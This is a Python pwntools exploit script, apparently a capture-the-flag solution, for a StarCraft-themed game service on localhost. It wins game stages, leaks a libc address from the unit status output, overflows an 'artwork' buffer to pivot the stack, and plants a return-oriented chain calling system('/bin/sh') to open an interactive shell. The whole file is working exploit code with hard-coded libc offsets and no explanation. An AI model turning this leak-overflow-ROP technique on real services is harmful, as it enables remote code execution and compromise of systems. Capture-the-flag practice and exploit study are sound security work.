#!/usr/bin/env python

from pwn import *
import os

p = remote('localhost', 9020)


# select unit
p.recvuntil('9. Ultralisk\n')
p.sendline('6')


# fight
stage_num = 1
morphed = False

while True:
    line = p.recvline()
    if 'option' in line:
        if stage_num == 12:
            break
        else:
            if morphed:
                p.sendline('0')
            else:
                morphed = True
                p.sendline('1')
    elif 'Stage' in line:
        stage_num = int(line[6:8])
    elif 'computer is ' in line:
        log.info('Stage %d - %s' % (stage_num, line[12:]))
    elif 'arcon is dead!' in line:
        log.failure('Arcon is dead...')
        exit(0)


# libc leak
p.sendline('2')

p.recvuntil('is burrowed : ')
lword = int(p.recvline())
if lword < 0:
    lword += 0x80000000
p.recvuntil('is burrow-able? : ')
hword = int(p.recvline())
if hword < 0:
    hword += 0x80000000

exit_addr = (hword << 32) | lword
log.success('Exit Addr: %x' % exit_addr)


# overflow
EXIT = 0x3b580
GADGET1 = 0xeef6f  # add rsp, 0xf8; ret
GADGET2 = 0x22a72  # pop rdi; ret
BINSH = 0x178d0f
SYSTEM = 0x45210

libc = exit_addr - EXIT

payload = 'a' * 264 + p64(libc + GADGET1) + p8(20)

p.recvuntil('(0. default) \n')
p.sendline('1')

p.recvuntil('artwork : \n')
p.sendline(payload)

while True:
    line = p.recvline()
    if 'option' in line:
        p.sendline('0')
    elif 'you win!' in line:
        break


# prepare payload at +f8 (eac0-e9c8)
p.recvuntil('cheat? (yes/no) : ')

log.success('Prepare Stack')
p.sendline(p64(libc + GADGET2) + p64(libc + BINSH) + p64(libc + SYSTEM))


# play until lose, and use cheat
p.interactive()
